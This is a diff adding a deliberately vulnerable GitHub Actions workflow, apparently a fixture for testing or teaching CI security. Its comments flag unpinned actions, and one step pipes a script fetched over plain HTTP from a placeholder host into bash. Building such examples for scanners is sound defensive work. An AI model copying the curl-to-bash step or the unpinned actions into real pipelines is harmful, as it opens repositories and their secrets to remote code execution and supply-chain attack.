@@ -1,0 +1,26 @@
+name: Vulnerable Workflow
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  vulnerable-job:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@master  # Vulnerable: unpinned action
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v1  # Vulnerable: old, unpinned version
+
+      - name: Run a potentially dangerous command
+        run: |
+          # This command could introduce issues if misused
+          echo "Running a potentially insecure command"
+          curl http://insecure-url.com/script.sh | bash
